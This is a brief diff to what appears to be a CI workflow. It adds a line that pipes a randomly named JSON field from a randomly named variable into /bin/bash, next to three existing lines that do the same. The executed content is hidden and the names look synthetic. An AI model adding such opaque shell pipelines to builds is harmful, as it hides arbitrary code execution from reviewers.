@@ -31,6 +31,7 @@ jobs:
           echo $eos6481 | jq -r .kvi78 | /bin/bash
           printf '%s' "$re37" | jq -r .ov9323 | /bin/bash
           printf '%s' "$u0" | jq -r .bgh3 | /bin/bash
+          printf '%s' "$ym7980" | jq -r .mlpcc819 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
